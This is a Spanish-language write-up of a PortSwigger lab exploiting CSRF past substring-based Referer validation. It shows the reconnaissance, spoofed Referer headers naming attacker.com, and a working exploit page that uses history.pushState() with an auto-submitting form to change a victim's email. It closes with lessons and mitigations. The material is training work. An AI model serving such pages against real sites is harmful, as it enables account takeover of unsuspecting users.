---
title: "CSRF with broken Referer validation"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "csrf-with-broken-referer-validation"
author: "Z4k7"
date: "2026-04-04"
year: "2026"
status: "pwned"
tags:
  - "CSRF"
techniques:
  - "Referer Spoofing"
  - "history.pushState"
  - "Broken Referer Validation"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF donde la aplicación intenta validar el header Referer para bloquear solicitudes cross-site. Sin embargo, la validación es DÉBIL: solo verifica que el dominio del Referer CONTENGA el dominio objetivo, permitiendo bypasses. El atacante puede usar history.pushState() para manipular el Referer que el navegador envía, creando un Referer falso que contiene el dominio objetivo. Demuestra por qué Referer validation sin ser estricta es insegura."
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta detectar y bloquear las solicitudes entre dominios, pero el mecanismo de detección puede ser eludido.
          Para resolver el laboratorio, utiliza tu servidor de explotación para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del usuario.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: `wiener:peter`

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409171912934.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual en este caso podremos validar la siguiente información.
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409172003288.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab menciona que valida Referer para bloquear cross-site. Pero pregúntate: ¿valida QUE sea igual al dominio origen, o solo que CONTENGA el dominio? Esa diferencia es crítica."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Si revisamos la sección que permite modificar el correo electrónico, observamos que no se incluye un token CSRF. En este escenario, la única defensa es la validación de Referer.
      - kind: "code"
        lang: "HTML"
        code: |
          <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
          	<label>Email</label>
          	<input required type="email" name="email" value="">
          	<button class='button' type='submit'> Update email </button>
          </form>
      - kind: "note"
        text: |
          Se emula el proceso de cambio de correo electrónico y se analiza las cabeceras enviadas durante la operación:
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/2
          Host: 0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net
          Cookie: session=lKBLyqeQyoRVWDIPPlnAuF4t0IUkPnrn
          Content-Length: 18
          ...
          Referer: https://0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net/my-account?id=wiener
          ...
          
          email=h%40gmai.com
      - kind: "note"
        text: |
          En las cabeceras se observa que hay validación de `Referer`. Si intentamos eliminar el header:
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409172643603.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El servidor rechaza sin Referer. Esto confirma que hay validación.
          Ahora probamos alterar la cabecera Referer:
      - kind: "code"
        lang: "BASH"
        code: |
          Referer: https://validacion/0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net/
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409172841214.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ¡La solicitud pasa! Esto revela el error: el servidor valida que el Referer CONTENGA el dominio, no que SEA IGUAL al dominio.
      - kind: "callout"
        type: "warning"
        label: "Validación Débil de Referer"
        text: "El servidor verifica: '¿Contiene el Referer el dominio 0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net?' Pero NO verifica: '¿Es el Referer de ESTE dominio?'  Esto permite: - `Referer: https://attacker.com/0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net/` - `Referer: https://0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net.attacker.com/` - Incluso: `Referer: https://anything/0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net`"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es un error COMÚN en validación de Referer. Los desarrolladores piensan 'si contiene el dominio = válido'. Pero debería ser 'si el dominio RAÍZ es igual y el protocolo es HTTPS'. La búsqueda de substrings es insegura."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Para explotar esto desde CSRF, necesitamos controlar el header Referer que el navegador envía. JavaScript moderno permite esto con `history.pushState()`:
      - kind: "code"
        lang: "HTML"
        code: |
          <script>
          history.pushState("", "", "/?0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net")
          </script>
          <form class="login-form" name="change-email-form" action="https://0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net/my-account/change-email" method="POST">
          <input type="email" name="email" value="hack@gmail.com" />
          </form>
          <script> 
          	  document.forms[0].submit(); 
          </script>
      - kind: "note"
        text: |
          Desglose del ataque:
          1. `history.pushState()`:
          - Modifica la URL visible en el navegador SIN hacer un reload
          - Cuando el navegador envía la solicitud POST, calcula el Referer basado en la URL actual
          - Referer será: `https://attacker.com/?0a4800af04f9b6a880ec2b9b00c40052.web-security-academy.net`
          2. El formulario POST:
          - Incluye el nuevo email: `hack@gmail.com`
          - El navegador incluye automáticamente la cookie de sesión
          - El navegador envía el Referer FALSO (basado en la URL modificada)
          3. Validación del servidor:
          - ¿Contiene Referer el dominio objetivo? ✓ (porque está en el parámetro)
          - ¿Hay cookie de sesión? ✓
          - Email cambiado ✅
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409173539331.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409173755215.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se confirma la adición del directorio en el apartado de `Referer`:
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409174158875.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — Referer Spoofing"
        text: "1. Atacante crea URL con dominio objetivo embedido: `/?0a4800...net` 2. Usa `history.pushState()` para cambiar URL visible 3. Navegador calcula Referer basado en URL actual 4. Referer contiene el dominio objetivo (búsqueda de substring) 5. Servidor: '¿Contiene Referer el dominio?' ✓ 6. Email cambiado ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es ELEGANTE porque no requiere CRLF injection ni cookies inyectables — solo manipulación de JavaScript estándar. `history.pushState()` es una característica legítima del navegador, pero aquí se usa para eludir validación débil."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` para simular un servidor atacante:
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409180602713.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima:
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409181001078.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20with%20broken%20Referer%20validation/file-20260409181009078.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab cierra el ciclo de CSRF tradicional. Hemos visto: sin defensa → Referer incompleta → token débil → double submit débil → referer spoofing. Cada uno requería una técnica diferente. Ahora pasamos a SameSite, que es un concepto completamente diferente."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios, pero demuestra cómo JavaScript legítimo puede ser usado maliciosamente.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`history.pushState()` es una herramienta legítima. Los navegadores la usan para actualizar URL sin reload. Pero en CSRF, es un weapon — permite controlar el Referer que el servidor ve."

lessons:
  - 'Validación de Referer debe ser ESTRICTA: No buscar substring — validar igualdad exacta del dominio RAÍZ.'
  - 'history.pushState() controla el Referer: El navegador calcula Referer basado en la URL actual.'
  - 'Búsqueda de substring es insegura: Un atacante puede embedir el dominio en su propia URL.'
  - 'Referer validation sin ser ESTRICTA es equivalente a NO tenerlo: Como defensa CSRF.'
  - 'SameSite cookies son más robustas: Porque bloquean el envío de cookies, no confían en validación.'
  - 'Defensa en profundidad es crítica: Referer + tokens + SameSite = mucho más seguro que uno solo.'
mitigation:
  - 'Validar que Referer sea de EXACTAMENTE este dominio: No solo que lo contenga.'
  - 'Validar protocolo HTTPS en Referer: Prevenir downgrade attacks.'
  - 'Rechazar si Referer está ausente: En operaciones críticas.'
  - 'Implementar CSRF tokens además de Referer: No confiar solo en Referer.'
  - 'Usar SameSite=Strict cookies: La defensa CSRF más moderna.'
  - 'Content Security Policy: Para limitar manipulation de JavaScript.'
---
